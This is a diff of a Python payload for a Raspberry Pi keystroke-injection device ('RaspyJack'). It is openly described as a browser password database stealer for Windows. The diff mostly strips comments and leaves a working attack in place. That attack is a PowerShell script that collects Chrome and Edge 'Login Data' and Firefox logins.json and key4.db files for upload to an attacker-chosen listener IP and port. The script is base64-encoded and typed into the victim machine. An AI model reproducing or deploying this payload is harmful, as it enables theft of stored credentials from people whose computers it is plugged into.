@@ -1,30 +1,17 @@
 #!/usr/bin/env python3
 import sys
-sys.path.append('/root/Raspyjack/')
-"""
-RaspyJack *payload* – **Evil: Browser Password DB Stealer (Windows)**
-======================================================================
-A HID attack that locates the password database files for common
-Chromium-based browsers (Chrome, Edge) and Firefox on Windows, and
-exfiltrates them to an attacker-controlled server.
-
-The actual decryption of these files must be done offline on the
-attacker's machine.
-
-**NOTE:** This requires a listener to be running to receive the data.
-"""
-
-import os, sys, subprocess, time
+import os
+import time
+import signal
+import subprocess
 sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
 import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
 
-# --- CONFIGURATION ---
-LISTENER_IP = "192.168.1.100" # Default IP, will be configurable
-LISTENER_PORT = "8000" # Default Port, will be configurable
+LISTENER_IP = "192.168.1.100"
+LISTENER_PORT = "8000"
 
-# --- GPIO & LCD ---
 PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
 GPIO.setmode(GPIO.BCM)
 for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
@@ -33,12 +20,11 @@ LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
 FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
 FONT = ImageFont.load_default()
 
-# --- Globals & Shutdown ---
 running = True
-current_ip_input = LISTENER_IP # Initial value for IP input
-ip_input_cursor_pos = 0 # Cursor position for IP input
-current_port_input = LISTENER_PORT # Initial value for Port input
-port_input_cursor_pos = 0 # Cursor position for Port input
+current_ip_input = LISTENER_IP
+ip_input_cursor_pos = 0
+current_port_input = LISTENER_PORT
+port_input_cursor_pos = 0
 
 def cleanup(*_):
     global running
@@ -47,11 +33,10 @@ def cleanup(*_):
 signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
 
-# --- Display Functions ---
 def show_message(lines, color="lime"):
     img = Image.new("RGB", (128, 128), "black")
     d = ImageDraw.Draw(img)
-    font = FONT_TITLE # Use FONT_TITLE for messages
+    font = FONT_TITLE
     y = 40
     for line in lines:
         bbox = d.textbbox((0, 0), line, font=font)
@@ -106,7 +91,7 @@ def handle_ip_input():
     global current_ip_input, ip_input_cursor_pos
     
     ip_segments = current_ip_input.split('.')
-    if len(ip_segments) != 4: # Reset if invalid format
+    if len(ip_segments) != 4:
         ip_segments = ["192", "168", "1", "100"]
         current_ip_input = ".".join(ip_segments)
     
@@ -117,22 +102,21 @@ def handle_ip_input():
         for name, pin in PINS.items():
             if GPIO.input(pin) == 0:
                 btn = name
-                while GPIO.input(pin) == 0: # Debounce
+                while GPIO.input(pin) == 0:
                     time.sleep(0.05)
                 break
         
-        if btn == "KEY3": # Cancel IP input
+        if btn == "KEY3":
             return False
         
-        if btn == "OK": # Confirm IP
-            # Validate IP format
+        if btn == "OK":
             parts = current_ip_input.split('.')
             if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                 return True
             else:
                 show_message(["Invalid IP!", "Try again."], "red")
                 time.sleep(2)
-                current_ip_input = "192.168.1.100" # Reset to default
+                current_ip_input = "192.168.1.100"
                 ip_input_cursor_pos = 0
                 draw_ui("ip_input")
         
@@ -151,12 +135,11 @@ def handle_ip_input():
                     digit = int(current_char)
                     if btn == "UP":
                         digit = (digit + 1) % 10
-                    else: # DOWN
+                    else:
                         digit = (digit - 1 + 10) % 10
                     char_list[ip_input_cursor_pos] = str(digit)
                     current_ip_input = "".join(char_list)
                 elif current_char == '.':
-                    # Cannot change dot, move cursor
                     if btn == "UP":
                         ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                     else:
@@ -176,20 +159,20 @@ def handle_port_input():
         for name, pin in PINS.items():
             if GPIO.input(pin) == 0:
                 btn = name
-                while GPIO.input(pin) == 0: # Debounce
+                while GPIO.input(pin) == 0:
                     time.sleep(0.05)
                 break
         
-        if btn == "KEY3": # Cancel Port input
+        if btn == "KEY3":
             return False
         
-        if btn == "OK": # Confirm Port
+        if btn == "OK":
             if current_port_input.isdigit() and 1 <= int(current_port_input) <= 65535:
                 return True
             else:
                 show_message(["Invalid Port!", "Try again."], "red")
                 time.sleep(2)
-                current_port_input = "8000" # Reset to default
+                current_port_input = "8000"
                 port_input_cursor_pos = 0
                 draw_ui("port_input")
         
@@ -208,7 +191,7 @@ def handle_port_input():
                     digit = int(current_char)
                     if btn == "UP":
                         digit = (digit + 1) % 10
-                    else: # DOWN
+                    else:
                         digit = (digit - 1 + 10) % 10
                     char_list[port_input_cursor_pos] = str(digit)
                     current_port_input = "".join(char_list)
@@ -217,7 +200,6 @@ def handle_port_input():
         time.sleep(0.1)
     return False
 
-# --- Main Attack Logic ---
 def run_attack():
     global LISTENER_IP, LISTENER_PORT
     
@@ -228,13 +210,12 @@ def run_attack():
         time.sleep(3)
         return False
 
-    # PowerShell script to find and upload browser DBs
     ps_script = f"""
 $paths = @(
-    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data",
-    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data",
-    "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json",
-    "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\key4.db"
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json",
+    "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\key4.db"
 )
 foreach ($path in $paths) {{
     $resolved = Resolve-Path $path -ErrorAction SilentlyContinue
@@ -248,7 +229,6 @@ foreach ($path in $paths) {{
     }}
 }}
 """
-    # The script is complex, so we'll download and execute it
     ps_command_b64 = "powershell -e " + subprocess.check_output(f"echo '{ps_script}' | iconv -t UTF-16LE | base64 -w 0", shell=True).decode().strip()
 
     script = f"""
@@ -277,7 +257,6 @@ press("ENTER")
         draw_ui("failed")
         return False
 
-# --- Execution ---
 if __name__ == '__main__':
     current_screen = "main"
     try:
@@ -291,7 +270,7 @@ if __name__ == '__main__':
                 
                 if GPIO.input(PINS["OK"]) == 0:
                     current_screen = "ip_input"
-                    time.sleep(0.3) # Debounce
+                    time.sleep(0.3)
             
             elif current_screen == "ip_input":
                 if handle_ip_input():
@@ -299,17 +278,17 @@ if __name__ == '__main__':
                     current_screen = "port_input"
                 else:
                     current_screen = "main"
-                time.sleep(0.3) # Debounce
+                time.sleep(0.3)
             
             elif current_screen == "port_input":
                 if handle_port_input():
                     LISTENER_PORT = current_port_input
                     if run_attack():
-                        time.sleep(3) # Display success/failure
+                        time.sleep(3)
                     current_screen = "main"
                 else:
                     current_screen = "main"
-                time.sleep(0.3) # Debounce
+                time.sleep(0.3)
             
             time.sleep(0.1)
             
